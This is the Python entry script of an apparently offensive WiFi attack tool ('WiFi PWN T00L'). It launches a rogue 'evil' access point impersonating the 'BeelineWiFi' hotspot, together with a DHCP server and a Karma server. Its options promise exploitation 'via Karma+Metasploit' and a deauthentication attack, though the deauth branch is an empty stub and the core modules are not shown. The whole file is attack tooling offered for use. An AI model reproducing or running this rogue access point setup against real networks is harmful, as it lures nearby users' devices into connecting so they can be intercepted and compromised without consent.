#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# WiFi PWN T00L
#
# author: @090h
from os import geteuid
from sys import exit
from argparse import ArgumentParser
from core.server.dhcp import *
from core.server.karma import *
from core.wifi.ap import *


class Pwner():
    def __init__(self, ip='192.168.1.1', mask='255.255.255.0', wifi='wlan0', essid='BeelineWiFi'):
        self.ip, self.mask, self.wifi, self.essid = ip, mask, wifi, essid

    def run(self):
        EvilAccessPoint(self.ip, self.mask, self.wifi, self.essid).run()
        DHCPServer(self.ip, self.mask).run()
        KarmaServer(self.ip).run()
        print("That's all kids 8).")


if __name__ == '__main__':
    parser = ArgumentParser(description='WiFi PWN T00L')
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
    parser.add_argument('-i', '--ip', required=False, default='192.168.1.1', help='ip for dhcpd (default=192.168.1.1)')
    parser.add_argument('-m', '--mask', required=False, default='255.255.255.0', help='network mask (default=255.255.255.0)')
    parser.add_argument('-w', '--wifi', required=False, default='wlan0', help='wifi card (default=wlan0)')
    parser.add_argument('-e', '--essid', required=False, default='BeelineWiFi', help='ESSID of evil AP (default=BeelineWiFi)')

    parser.add_argument('-P', '--pwn', required=False, action='store_true', help='start PWN via Karma+Metasploit')
    parser.add_argument('-D', '--deauth', required=False, action='store_true', help='start deauth attack')
    parser.add_argument('-I', '--interactive', required=False, action='store_true', help='start deauth attack')

    args = parser.parse_args()

    if geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'.")

    if args.pwn:
        Pwner(args.ip, args.mask, args.wifi, args.essid).run()

    if args.deauth:
        pass

